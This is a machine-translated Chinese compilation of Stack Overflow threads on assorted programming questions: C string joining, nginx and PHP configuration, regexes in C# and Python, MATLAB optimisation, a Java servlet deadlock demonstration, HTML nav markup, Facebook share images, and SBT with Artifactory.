> 时间：2013-05-30T14:56:01.203

如果要将其设置为预定义样式，可以使用

```
 [navigationBar setBarStyle: UIBarStyleBlack]; 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2015-08-03T02:35:58.210

对我有用的是：

```
self.navigationController.navigationBar.titleTextAttributes = [NSDictionary dictionaryWithObject:[UIColor textPrimaryColor] forKey:NSForegroundColorAttributeName]; 
```

# c - 将二维数组转换为 char* 数组并将 char 复制到字符串末尾的最快方法

> ID：11583613
> 
> 赞同：0
> 
> 时间：2012-07-20T16:42:37.540
> 
> 标签：c, optimization, string-concatenation

我正在寻找示例代码或如何改进下面的代码（IMO 非常慢，但这是我可以编写的）以最快的方式将 2D 数组转换为 a`char*`并将 a 复制`char`到其中。

```
char*
join(int c, size_t arrsize, const char* arr[])
{
  char *buf, *tbuf, *val;
  size_t i, vsize, total;

  buf = malloc(1);
  for(i = total = 0; i < arrsize; ++i) {
    val = arr[i];
    vsize = strlen(val);

    if((tbuf = realloc(buf, total + vsize + 2)) == NULL) {
      if(buf != NULL)
        free(buf);
      return NULL;
    }

    buf = tbuf;

    memcpy(buf + total, val, vsize);
    total += vsize;

    buf[total] = c;
    total += 1;
  }

  buf[total] = '\0';
  return buf;
} 
```

打电话

```
const char *foo[] = { "a", "b", "c"};
char *baa = join(' ', 2, foo); //a b c
if(baa) {
  printf("%s\n", baa);
    free(baa);
} else {
    printf("No memory\n");
} 
```

如何优化？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T17:21:19.767

我同意 Shawn 的观点，单个 malloc 调用可能更有利。当他发布他的答案时，我正在编写自己的代码：

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char* join(char delimiter, size_t arrsize, const char* arr[]) {
    size_t i;
    size_t total;
    char* joined;

    for (i = total = 0; i < arrsize; i++) {
        if (arr[i] != NULL) 
            total += strlen(arr[i]) + 1; // size of c-style string + delimiter
    }

    // Note that last delimiter will actually be null termination
    joined = (char*)malloc(sizeof(char) * total);

    if (joined != NULL) {
            // first character isn't guaranteed to be null termination
            // set it so strcat works as intended, just in case
            joined[0] = '\0';
        for (i = 0; i < arrsize; i++) {
            if (arr[i] != NULL) {
                strcat(joined, arr[i]);

                if ((i + 1) != arrsize) 
                    strncat(joined, &delimiter, 1);
        }
    }

    return joined;
}

int main(int argc, char** argv) {
    const char* foo[] = { "aasdasd", "bgsfsdf", "asdasisc" };

    char* baa = join(' ', 3, foo);

    if (baa != NULL) {
        printf("%s\n", baa);
        free(baa);
    } else {
        printf("No memory\n");
    }

    return 0;
} 
```

我根据我认为您要完成的操作进行了一些更改， join 的第一个参数是用于分隔组合字符串的字符分隔符，第二个是 arr 中的字符串数，第三个显然是数组。

代码应该编译并运行，输出“assdasd bgsfsdf asdasisc”，即我在填充数组进行测试时在键盘上捣碎的内容：P

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-20T16:49:28.583

而不是重复调用`realloc`，您可以进行第一次循环`arr`以确定总长度，然后`malloc`只调用一次。之后，只需再次循环并使用正确的偏移量`arr`进行调用即可。`memcpy`

可能是这样的（请注意，这是**未经测试**的，可能包含错误）：

```
/* join strings in arr with c as separator */
char* join(int c, size_t arrsize, const char* arr[]) {
  char *buf;
  size_t i, len, total = 0;

  /* determine total length of all strings */
  for (i = 0; i < arrsize; ++i) {
    total += strlen(arr[i]);
  }

  /* allocate mem */
  buf = malloc(total + arrsize);
  if (!buf) return NULL;

  /* copy in all strings from arr */
  total = 0;
  for (i = 0; i < arrsize; ++i) {
    len = strlen(arr[i]);
    memcpy(buf + total, arr[i], len);
    total += len;

    /* append separator (or NUL if last string) */
    buf[total++] = (i == arrsize-1) ? '\0' : c;
  }

  return buf;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-20T17:10:33.913

如果您可以限制 arr 中字符串的总大小（例如，2048）。有了这个，您可以消除 strcpy 和 strlen 函数中的迭代开销：

```
char*
join(int c, size_t arrsize, const char* arr[])
{
  char *buffer;
  size_t i, vsize;
  char *b;

  buffer = malloc(2048);
  b = buffer;
  vsize = 0;
  for(i = 0; i < arrsize; ++i) {
    char *p = arr[i];
    while (*p) {
      *b = *p; 
      b++; p++;
      vsize++;
    } 
    *b = c; b++;
  }

  buffer[vsize++] = '\0';
  return realloc(buffer, vsize);
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-20T17:16:58.660

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char* join(char c, size_t arrsize, const char* arr[]){
    size_t i, total, len[arrsize];
    char *buff, *ret;

    for(total=i=0;i<arrsize;++i)
        total+=(len[i]=strlen(arr[i]));
    if(NULL==(ret=buff=(char*)malloc((total + arrsize)*sizeof(char))))
        return NULL;
    for(i=0;i<arrsize;++i){
        memcpy(buff, arr[i], len[i]);
        buff+=len[i];
        *buff++=c;
    }
    *--buff='\0';
    return ret;
}

int main(){
    const char *foo[] = { "a", "b", "c"};
    char *baa = join(' ', sizeof(foo)/sizeof(char*), foo); //a b c
    if(baa) {
        printf("\"%s\"\n", baa);
        free(baa);
    } else {
        printf("No memory\n");
    }
    return 0;
} 
```

# php - php代码见源码

> ID：11583623
> 
> 赞同：3
> 
> 时间：2012-07-20T16:43:36.090
> 
> 标签：php, nginx

我刚刚搬到 nginx 并将我的 php 更新到 php5.3。现在我所有的 PHP 代码都显示在页面源代码中，如下所示：

```
 <div class="bar-icon">
        <!-- FaceBook Share -->  
                 <?php include ('facebook_icon_like.php')?> 
        <!-- /FaceBook Share --> 
  </div> 
```

请帮忙。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-20T16:51:21.317

这意味着您的 nginx 引擎没有启用 PHP。按照[此处](https://askubuntu.com/questions/134666/what-is-the-easiest-way-to-enable-php-on-nginx)的说明进行操作，看看是否有帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-20T16:52:26.543

您必须在 Nginx 服务器中启用 PHP。
如果您使用的是 PHP-FPM，您可以在配置中添加如下内容：

```
server {
    listen 80 default;

    root   /var/www/default/public;
    index index.php;

    location ~ \.php$ {
        include /usr/local/nginx/conf/fastcgi_params;
        fastcgi_index index.php;
        if (-f $request_filename) {
            fastcgi_pass 127.0.0.1:9000;
        }
    }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-20T16:57:32.920

根据您的评论，如果文件扩展名不是`.php`，并且您没有指定任何规则让 nginx 将非`.php`文件上的 PHP 解析为 PHP 文件，那么这些文件将不会执行 PHP 代码。

将扩展名更改为`.php`

# c# - 使用正则表达式评估字符串

> ID：11583631
> 
> 赞同：0
> 
> 时间：2012-07-20T16:44:07.587
> 
> 标签：c#, regex

我`Regex.IsMatch()`用来评估单词列表。

如果评估以下字符串，则`Regex`应该返回`true`：-hellotest -helloabc -abchello

如果评估以下字符串，则`Regex`应该返回 false：-helloworld -worldtest -abcworld

`true`基本上，如果`"hello"`在字符串中找到该单词并且在字符串`"world"`中***未***找到该单词，我希望它返回。

`Regex`产生这种结果的原因是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T16:54:39.993

使用表达式

```
(?<!world.*)hello(?!.*world) 
```

* * *

`(?<!prefix)pos`是消极的环顾四周。`pos`仅匹配，如果之前没有`prefix`

`pos(?!suffix)`仅在未成功时才匹配`suffix`

# apache - Curl 和 wget 在托管服务器上返回 404，从外部工作正常

> ID：11583639
> 
> 赞同：1
> 
> 时间：2012-07-20T16:44:22.690
> 
> 标签：apache, .htaccess, curl, centos

我正在尝试从我的托管服务器执行一个简单的 curl 命令，它返回 404 ，但是当我从我自己的机器或浏览器运行相同的命令时，它工作正常。

奇怪的部分是我在同一台服务器上运行两个网站，第二个网站通过在服务器上或我的机器上使用 curl 运行良好。但是这个有一个问题，它适用于索引页面，但任何其他页面都会返回 404。

我已经检查了 htacess 和日志，没有任何帮助。

我查看了许多其他帖子和谷歌，但找不到有效的答案。感谢您的帮助。

我正在使用 Cent Os 4 。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T18:29:15.580

如果是代理问题，请在 httpd.conf 中查找类似内容：

反向代理

```
ProxyPass /foo http://foo.example.com/bar
ProxyPassReverse /foo http://foo.example.com/bar 
```

正向代理

```
ProxyRequests On
ProxyVia On

<Proxy *>
Order deny,allow
Deny from all
Allow from internal.example.com
</Proxy> 
```

如您所见，其中可能有一个 allow from 指令，这就是您可能遇到的情况。

也可能是，如果你在主机上，你看不到 /blog/ 子目录，因为你的主机为你做代理。然后你会在你的机器上查询它不知道的子目录。

可悲的是，没有人能说出来，除非他能亲自看看这台机器。但是现在你已经掌握了所有这些问题，我很肯定你会更接近解决方案。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-20T16:54:07.693

您需要确定机器是否在本地知道其 dns 条目。

因此，您在家中使用的 DNS 服务器知道 url 中编码的服务器就是该特定服务器。而宿主机的外向路由器显然也知道这一点。但这并不意味着机器本身也知道这一点。

所以尝试一个

```
nslookup www.yourdomain.com 
```

从托管服务器的 shell 中查看它是否知道自己的身份。

如果没有，您可以在 hosts 文件中输入您的域作为 127.0.0.1 的附加条目。

域名解析总是首先使用 hosts 文件，然后是配置的 dns 服务器 - 然后失败。

# matlab - Matlab优化

> ID：11583642
> 
> 赞同：0
> 
> 时间：2012-07-20T16:44:30.987
> 
> 标签：matlab, optimization, bsxfun

如果这太像“做我的功课”问题，我深表歉意。我有点卡住了，这是我要去的地方。这不是我编写的代码，但我现在正在维护它。

我有一个工具可以在糟糕的一天运行大约 8 个小时。我今天介绍了它。91.4% 的运行时间在一个子函数中，而这 70% 的时间都花在了这一行代码上。由于在 3-4 个嵌套的 for 循环内（不可避免），这在分析运行中被有效调用了 60000 次

```
 testincrease = ones(183,3021)*.02;
    cRange = (0:177)'; %fix broken syntax highlighting --> '
    pRate = ones(183,3021)*.02;
    lengthA = 0;
    lengthP = 178;
    nSim = 3021;

    tic
    for i  = 1:100
    v_F = @(adj_N,adj_I) (((1+ adj_I+ testincrease(cRange+1,:))./(1 + adj_N + pRate(cRange+1,:))).^...
                repmat([cRange+0.5],[1 nSim]))...
                ./ ...
                (repmat(((1+adj_I+testincrease(lengthA+1,:))./(1 + adj_N+ pRate(lengthA+1,:))), [lengthP 1]).^...
                repmat([repmat(cRange(1), [lengthP 1])], [1 nSim]));
    v=v_F(0,0);
    end
    toc 
```

目前的想法：

我认为也许我可以使用 bsxfun 代替 repmat （目前正在尝试）

当 cRange(1) = 0 时（就像在我的测试数据的一部分中所做的那样——我放在这里的部分），后半部分只是简单地除以 1——一种昂贵且毫无意义的计算。所以我想围绕这个使用'if'子句来避免不必要的计算。

调用另一种语言——这对我来说是全新的。应该会去试试吧。显然可以轻松访问 java，并且还可以创建 mex 文件。在后一种情况下，我认为传递数据的开销将非常昂贵，除非我重写大量代码而不仅仅是这一行。

如果您有任何其他想法，我将不胜感激。如果没有，我会继续做更多的研究。

编辑：刚刚注意到函数 repmats 的最后一行是完全没有必要的，因为您可以 .^ 通过标量值而无需将其更改为矩阵

二次编辑：这是到目前为止的样子。节省 30%。

```
tic
for i  = 1:100
    if cRange(1) == 0

        v_F = @(adj_N,adj_I) bsxfun(@power,((1+ adj_I+ testincrease(cRange+1,:))./(1 + adj_N + pRate(cRange+1,:))),cRange+0.5);

    else
        v_F = @(adj_N,adj_I) bsxfun(@power,((1+ adj_I+ testincrease(cRange+1,:))./(1 + adj_N + pRate(cRange+1,:))),cRange+0.5)...
            ./ ...
            (repmat(((1+adj_I+testincrease(lengthA+1,:))./(1 + adj_N+ pRate(lengthA+1,:))).^cRange(1), [lengthP 1]));

    end
    v=v_F(0,0);
end
AllChange = toc; 
```

但由于某种原因，在 2011a 年加速它的 bsxfun 变化在我们编译的 2008 年减慢了它。臭虫。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-20T17:46:17.140

建议 1 - 尝试在没有 repmat 的情况下重写代码：

`repmat`进行大量的内存分配和内存副本......因此，如果您将代码重写为相同的功能但不使用`repmat`它可能会大大提高速度。（仅供参考......一行代码有4个`repmat`函数调用......其中一个`repmat`调用有`repmat`它的内部......这将非常慢。）

建议 2 - 尝试重写单行：

将这个 MASSIVE 单行代码重写为多行。然后重新运行您的探查器。然后，您将能够更清楚地看到导致减速的确切原因！然后你可以修复那段代码。（专业提示：由于各种原因（可读性、调试、性能等），大型单行有时并不是代码中最好的东西）——Trevor Boyd Smith 17 秒前编辑

建议 3 - 利用并行化：

我认为您的一行代码中的大多数操作都可以并行化。所以我建议先试试Matlab的parallel toolboo。然后，如果这还不够快...尝试通过外部第三方 Matlab GPU 加速软件包（如[Jacket](http://www.accelereyes.com/products/jacket) ）使用 GPU 加速。

* * *

（免责声明：这些是一般提示......我自己还没有尝试过这些......但我会在有时间的时候尝试。）

# java - 在 servlet 中创建死锁的方法

> ID：11583644
> 
> 赞同：0
> 
> 时间：2012-07-20T16:44:37.620
> 
> 标签：java, jakarta-ee, servlets

您能否建议我们如何在 servlet 中创建死锁，我认为这是在 doGet() 中调用 doPost() 方法和在 doPost() 中调用 doGet() 方法的一种简单方法，它将为 servlet 创建死锁情况. 请问有没有其他方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-11-20T14:43:40.317

对于每个请求，Web 容器都会创建一个新线程。在我的 servlet 中，我保留了 2 个方法。一个是doGet，另一个是doPost。这是我的servlet代码

```
public class DeadLockServlet extends HttpServlet {
       public static Object s = new Object();
       public static Object s1 = new Object();
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        synchronized (s) {
            System.out.println("Got lock of s in get");
            try {
                Thread.sleep(9977);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
      System.out.println("waiting for lock of s1 in get");
        synchronized (s1) {
            System.out.println("Got lock of s1 in get");
        }
        }

    }
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        synchronized (s1) {
            System.out.println("Got lock of s1 in post");
            try {
                Thread.sleep(9977);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
     System.out.println("waiting for lock of s in post");
        synchronized (s) {
            System.out.println("Got lock of s in  post");
        }
    }}

} 
```

我的 abc.jsp 代码在这里

```
 <form action="DeadLockServlet" method="post">
    <input type="submit" value='ok'/>
    </form> 
```

我正在从一个浏览器[http://localhost:8090/DeadLockTest/abc.jsp](http://localhost:8090/DeadLockTest/abc.jsp)向我的 servlet 发送请求（单击确定按钮时的 post 方法）。

来自另一个浏览器的另一个请求，例如[http://localhost:8090/DeadLockTest/DeadLockServlet](http://localhost:8090/DeadLockTest/DeadLockServlet)（用于 Get 方法）。现在您将遇到死锁情况

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-20T16:51:00.990

有很多方法（我敢说是无限期的吗？）来制造死锁。您的示例在某种程度上是一种（主要是无限循环）。最简单的方法是在一个对象上创建一个锁，该对象调用另一个方法来获取同一个对象上的锁，在这种情况下，锁将永远不会释放，因为它正在等待另一个方法获取锁，这是它无法做到的因为该对象已经锁定了它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-20T16:59:57.957

在下面部署 servlet 并调用它几次。

```
public class DeadLockServlet extends HttpServlet {
       private static long sleepMillis = 10000;
       private final Object lock1 = new Object();
       private final Object lock2 = new Object();

   private boolean switch = true;

   public void doGet(HttpServletRequest req, HttpServletResponse res)  throws ServletException, IOException  {

        if(switch){
            switch=!switch;
            lock12();
        }
        else{
            switch=!switch;
            lock21();
        }
        PrintWriter out = res.getWriter();
        out.println("Done!");
        out.close();
  }

   private void lock12() {
       synchronized (lock1) {
           sleep();
           synchronized (lock2) {
               sleep();
           }
       }
   }

   private void lock21() {
       synchronized (lock2) {
           sleep();
           synchronized (lock1) {
               sleep();
           }
       }
   }

   private void sleep() {
       try {
           Thread.sleep(sleepMillis);
       } catch (InterruptedException e) {
           e.printStackTrace();
       }
   }

} 
```

# python - 获取列表前缀后缀的最小列表的算法或python实现

> ID：11583649
> 
> 赞同：1
> 
> 时间：2012-07-20T16:44:48.663
> 
> 标签：python, string

我试图找到一个带有单词列表的算法，给出前缀和后缀的最小列表，这样每个单词都是前缀和后缀的串联。

前任 ：

```
[banano, ananas, applenas, appleno, neo, neas]

=> [bana,anan,e, apple] [as no] 
```

那可能吗 ？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-20T23:39:28.287

解决方案不是唯一定义的。例如，对于语言 [aa, ab, bb]，解决方案可能是 [a, b] [a, b] 或 [aa, ab, bb] 和空字符串。

该问题可以理解为最小字符串覆盖问题的一个实例（假设每个字符串以强制的开始字符串字符开头，并以另一个强制的结束字符串字符结束。允许的覆盖字典将包含所有前缀和输入语言中所有单词的所有后缀。

一般的字符串覆盖问题是 NP 难的，但是一旦你强加规则（这里由开始字符串和结束字符串字符的出现暗示），只有固定的最大数量的字符串（这里是两个）可以覆盖任何给定输入字符串，它变成[多项式可解](http://siam.omnibooksonline.com/2012ALENEX/data/papers/019.pdf)的。

这是最小字符串覆盖问题[求解器](http://code.google.com/p/string-cover/)的C++ 实现。

# python - 在 Python 中查找多个字符串出现的最佳方法

> ID：11583650
> 
> 赞同：-2
> 
> 时间：2012-07-20T16:44:49.880
> 
> 标签：python, regex, string, find

对于我正在处理的这个问题，我需要指出正确的方向：

假设我正在读取 C 程序的输出，如下所示：

```
while True:
    ln = p.stdout.readline()
    if '' == ln:
        break
    #do stuff here with ln 
```

我的输出看起来像这一行：

```
TrnIq: Thread on CPU 37
TrnIq: Thread on CPU 37 but will be moved to CPU 44
IP-Thread on CPU 33
FANOUT Thread on CPU 37
Filter-Thread on CPU 38 but will be moved to CPU 51
TRN TMR Test 2 Supervisor Thread on CPU 34
HomographyWarp Traking Thread[0] on CPU 26 
```

我想将“TrnIq：Thread on”和“37”捕获为两个单独的变量：一个字符串和一个来自输出“TrnIq：Thread on CPU 37”的数字。

对于其他行而言，它非常相似，例如从“HomographyWarp Traking Thread[0] on CPU 26”捕获“HomographyWarp Traking Thread[0] on”和#“26”。

唯一真正的挑战是这样的行：“CPU 38 上的过滤器线程，但将移动到 CPU 51”在这一行我需要“Filer-Thread”和#“51”而不是第一个 #“38”。

Python 有很多不同的方法可以做到这一点，我什至不知道从哪里开始！

提前致谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-20T16:53:03.443

以下应该返回一个信息元组，假设`ln`是单行数据（编辑以包括将 CPU 值转换为 int）：

```
match = re.match(r'(.*?)(?: on CPU.*)?(?: (?:on|to) CPU )(.*)', ln).groups()
if match:
    proc, cpu = match.groups()
    cpu = int(cpu) 
```

例子：

```
>>> import re
>>> for ln in lines:
...     print re.match(r'(.*?)(?: on CPU.*)?(?: (?:on|to) CPU )(.*)', ln).groups()
... 
('TrnIq: Thread', '37')
('TrnIq: Thread', '44')
('IP-Thread', '33')
('FANOUT Thread', '37')
('Filter-Thread', '51')
('TRN TMR Test 2 Supervisor Thread', '34')
('HomographyWarp Traking Thread[0]', '26') 
```

解释：

```
(.*?)          # capture zero or more characters at the start of the string,
               #   as few characters as possible
(?: on CPU.*)? # optionally match ' on CPU' followed by any number of characters,
               #   do not capture this
(?: (?:on|to) CPU )  # match ' on CPU ' or ' to CPU ', but don't capture
(.*)           # capture the rest of the line 
```

rubular：[http ://www.rubular.com/r/HqS9nGdmbM](http://www.rubular.com/r/HqS9nGdmbM)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-20T17:08:10.357

正则表达式在这里对我来说似乎有点矫枉过正。[免责声明：我不喜欢正则表达式，但喜欢 Python，所以我尽可能用 Python 编写，而不是编写正则表达式。由于我从未完全理解的原因，这被认为是令人惊讶的。]

```
s = """TrnIq: Thread on CPU 37
TrnIq: Thread on CPU 37 but will be moved to CPU 44
IP-Thread on CPU 33
FANOUT Thread on CPU 37
Filter-Thread on CPU 38 but will be moved to CPU 51
TRN TMR Test 2 Supervisor Thread on CPU 34
HomographyWarp Traking Thread[0] on CPU 26"""

for line in s.splitlines():
    words = line.split()
    if not ("CPU" in words and "on" in words): continue # skip uninteresting lines
    prefix_words = words[:words.index("on")+1]
    prefix = ' '.join(prefix_words)
    cpu = int(words[-1])
    print (prefix, cpu) 
```

给

```
('TrnIq: Thread on', 37)
('TrnIq: Thread on', 44)
('IP-Thread on', 33)
('FANOUT Thread on', 37)
('Filter-Thread on', 51)
('TRN TMR Test 2 Supervisor Thread on', 34)
('HomographyWarp Traking Thread[0] on', 26) 
```

而且我认为我不需要将任何代码翻译成英文。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-20T16:54:26.920

所以使用正则表达式`^(.*?)\s+on\s+CPU.*(?<=\sCPU)\s+(\d+)\s*$`

```
import sys
import re

for ln in sys.stdin:
  m = re.match(r'^(.*?)\s+on\s+CPU.*(?<=\sCPU)\s+(\d+)\s*$', ln); 
  if m is not None:
    print m.groups(); 
```

[在此处](http://ideone.com/uKfgO)查看并测试示例。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-20T16:55:26.670

在您提到的情况下，您总是需要第二个 CPU 编号，因此可以使用单个正则表达式来完成：

```
# Test program
import re

lns = [
    "TrnIq: Thread on CPU 37",
    "TrnIq: Thread on CPU 37 but will be moved to CPU 44",
    "IP-Thread on CPU 33",
    "FANOUT Thread on CPU 37",
    "Filter-Thread on CPU 38 but will be moved to CPU 51",
    "TRN TMR Test 2 Supervisor Thread on CPU 34",
    "HomographyWarp Traking Thread[0] on CPU 26"
]

for ln in lns:
    test    = re.search("(?P<process>.*Thread\S* on).* CPU (?P<cpu>\d+)$", ln)
    print "%s: '%s' on CPU #%s" % ( ln, test.group('process'), test.group('cpu')) 
```

在一般情况下，您可能想要区分不同的情况（例如 CPU 上的线程、移动的线程、子线程......）。为此，您可以一个接一个地使用多个 re.search()。例如：

```
# This search recognizes lines of the form "...Thread on CPU so-and-so", and
# also lines that add "...but will be moved to CPU some-other-cpu".
test = re.search("(?P<process>.* Thread) on CPU (?P<cpu1>\d+)( but will be moved to CPU (?P<cpu2>\d+))*", ln)
if test:
   # Here we capture Process Thread, both moved and non moved
   if test.group('cpu2'):
       # We have process, cpu1 and cpu2: moved thread
   else:
       # Nonmoved task, we have test.group('process') and cpu1.
else:
   # No match, try some other regexp. For example processes with a thread number
   # between square brackets: "Thread[0]", which are not captured by the regex above.
   test = re.search("(?P<process>.*) Thread[(?P<thread>\d+)] on CPU (?P<cpu1>)", ln)
   if test:
       # Here we have Homography Traking in process, 0 in thread, 26 in cpu1 
```

为了获得最佳性能，最好先对出现频率更高的线路进行测试。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-07-20T17:00:06.293

它可以通过两个正则表达式搜索非常简单地完成：

```
import re

while True:
    ln = p.stdout.readline()
    if '' == ln:
        break

    start_match = re.search(r'^(.*?) on', ln)
    end_match = re.search(r'(\d+)$', ln)
    process = start_match and start_match.group(0)
    process_number = end_match and end_match.group(0) 
```

# html - 导航可以有自己的标题吗？

> ID：11583657
> 
> 赞同：0
> 
> 时间：2012-07-20T16:44:59.263
> 
> 标签：html

将 header 元素直接放在 nav 中是不是很糟糕？

假设我想要一个左侧带有“Site::Page”的水平条，右侧是指向我页面中文章的链接列表，这样可以吗：

```
<nav>
  <header>Fruitland::Three common bananas</header>
  <ul><li>Link to kind 1</li><li>Link to kind 2</li><li>Link to kind 3</li></ul>
</nav> 
```

还是我应该只将 ul 包装在导航中，使用 h4 作为左侧部分，使用 div 将整个东西绑定在一起？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T16:53:50.330

不，它不是“坏的”，但它可能被认为是`<h1>`在这里使用的最佳实践。参考[W3C 文档中`<nav>`元素](http://dev.w3.org/html5/spec/single-page.html#the-nav-element)的第一个示例，他们使用一个`<h1>`inside a`<nav>`来描述他们的导航菜单。

W3C 似乎喜欢`<header>`在其他地方使用，例如在`<body>`或`<article>`元素内。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-20T16:57:08.613

虽然它可能还不错..我更有可能使用以下..

```
<section>.    
  <header>blah</header>
  <nav>....</nav>
</section> 
```

# html - 网站：无法识别 Facebook 分享链接图像

> ID：11583660
> 
> 赞同：-1
> 
> 时间：2012-07-20T16:45:05.083
> 
> 标签：html, facebook, web, share, meta

这个问题一直困扰着我超过 24 个工作小时。我的网站“ghostwriter.co.nf”在页面右侧有一个 Facebook 分享栏。进行 facebook 分享时，没有图像显示为缩略图。现在我对这个网站和其他网站做了一些研究，这些研究让我

1.  创建元标记：

    元属性="og:title" 内容="客座作家" />

    元属性="og:type" 内容="网站" />

    元属性="og:url" 内容="http://ghostwriter.co.nf" />

    元属性="og:image" 内容="http://ghostwriter.co.nf/image/bannergw4med.jpg" />

    meta property="og:site_name" content="Guest Writer" />

2.  使用 facebook linter 工具更新 facebook cashe

两者都没有工作，当我运行 linter 工具时，我收到消息 - **“无法下载 og:image：无法下载 og:image 标签的 url 引用的图像。”**

有人可以看看我非常简单的代码，看看他们是否可以帮助我提前感谢您的所有帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T17:05:21.517

即使您说您可以访问该图像，我想您也是在本地进行的，然后您就拥有了所需的所有权限。在远程请求上（就像我要求图片一样），您会收到一个 php 权限错误，就像我在此屏幕截图中所做的那样：

[http://i48.tinypic.com/mkiwdf.jpg](http://i48.tinypic.com/mkiwdf.jpg)

授予匿名 iis/apachi 用户正确的权限，一切都应该没问题。

# ews-managed-api - 用于管理（添加/删除/获取）邮箱权限的 EWS 托管 API

> ID：11583661
> 
> 赞同：1
> 
> 时间：2012-07-20T16:45:06.013
> 
> 标签：ews-managed-api

EWS 托管 API 能否用于管理 Exchange 2010 Online 环境中的邮箱权限？特别是 Get-MailboxPermission Add-MailboxPermission Remove-MailboxPermission Add-ReceipientPermission Remove-RecipientPermission

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T09:43:55.757

邮箱权限类似于文件夹权限，这应该是可能的。请参阅[http://msdn.microsoft.com/en-us/library/exchange/bb856574%28v=exchg.80%29.aspx](http://msdn.microsoft.com/en-us/library/exchange/bb856574%28v=exchg.80%29.aspx)

# scala - 让 Maven 和 SBT 都使用本地 Artifactory-server

> ID：11583665
> 
> 赞同：7
> 
> 时间：2012-07-20T16:45:32.533
> 
> 标签：scala, maven, sbt, artifactory

我需要让 Maven 和 SBT 都使用本地 Artifactory-server，它是唯一具有 Internet 连接的机器。服务器、CI 机器等无法访问外部世界。

尤其是 SBT，我的头发变白了。

## 连接到 Artifactory 的 SBT 问题

使用 0.11.[0..3] 我可以通过以下方式 SBT 访问 Artifactory：

*   解压 sbt-launcher.jar
*   获取 sbt.boot.properties 并将其复制到某处
*   编辑 sbt.boot.properties 以仅包含“本地”存储库和我们的 Artifactory 服务器

对于 0.12 或 0.13 版本，我没有运气。我已经尝试过这里的说明：[https](https://github.com/harrah/xsbt/pull/472) ://github.com/harrah/xsbt/pull/472 。所以我做了以下工作：

*   我自己建立了 SBT
*   我已将“存储库”文件放入 ~/.sbt/
*   “存储库”文件包括：

    `[repositories]`

    `local`

    `ivy-proxy: http://devserver:8081/artifactory/repo/, [organization]/[module]/[revision]/[type]s/[artifact](-[classifier]).[ext]`

    `maven-proxy: http://devserver:8081/artifactory/repo/`

*   我在 SBT 的启动命令中包含了“-Dsbt.override.build.repos=true”，现在看起来像这样：

    `java -Xms1536m -Xmx1536m -XX:MaxPermSize=384m -XX:ReservedCodeCacheSize=192m -Dsbt.override.build.repos=true -Dsbt.global.base=/Users/amjr/.sbt/0.13.0-SNAPSHOT -jar /Users/amjr/.bin/.lib/0.13.0-SNAPSHOT/sbt-launch.jar`

但是 0.12 和 0.13 拒绝访问 Artifactory，而是尝试直接连接到 typesafe、maven central 等。

## SBT确实访问它时的工件和问题

现在对于 0.11 系列的 SBT，我可以让它连接到 Artifactory。然后是 SBT 无法找到编译项目所需的包的问题。这是示例：

```
==== local-artifactory-libs-snapshot: tried

  http://devserver:8081/artifactory/libs-snapshot/org/scala-sbt/compiler-interface/0.11.3/compiler-interface-src-0.11.3.jar

==== local-artifactory-libs-releases: tried

  http://devserver:8081/artifactory/libs-release/org/scala-sbt/compiler-interface/0.11.3/compiler-interface-src-0.11.3.jar

==== local-artifactory-plugins-releases: tried

  http://devserver:8081/artifactory/plugins-release/org/scala-sbt/compiler-interface/0.11.3/compiler-interface-src-0.11.3.jar 
```

这显然与 Artifactory 配置有关。如果有人有任何指示我应该如何以及应该使用 Artifactory 代理哪些存储库以便成功地将它与 SBT 一起使用，我将不胜感激。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-04T17:11:07.317

我为我们的工作环境设置了以下对 scala 友好的存储库：

*   斯卡拉工具：[https ://oss.sonatype.org/content/groups/scala-tools/](https://oss.sonatype.org/content/groups/scala-tools/)
*   [类型安全： http:](http://repo.typesafe.com/typesafe/releases/) //repo.typesafe.com/typesafe/releases/
*   JFrog：[http ://repo.jfrog.org/artifactory/libs-releases-local](http://repo.jfrog.org/artifactory/libs-releases-local)

您上面提到的编译器接口在 Typesafe 存储库中，具体来说

[http://repo.typesafe.com/typesafe/maven-ivy-releases/org.scala-sbt/compiler-interface/0.11.3/](http://repo.typesafe.com/typesafe/maven-ivy-releases/org.scala-sbt/compiler-interface/0.11.3/)

# javascript - 访问窗口宽度时未触发 onresize 事件

> ID：11583666
> 
> 赞同：0
> 
> 时间：2012-07-20T16:45:32.883
> 
> 标签：javascript, onresize

我已经将 onresize 侦听器附加到 body 标记上，但是当我更改代码以访问时`window.innerWidth`，`window.innerHeight`我的 resize 事件只能工作一次。

```
<script type="text/javascript">
    function showMsg()
    {
        document.write((window.innerWidth / window.innerHeight) * 100 + "%");
    }
</script>
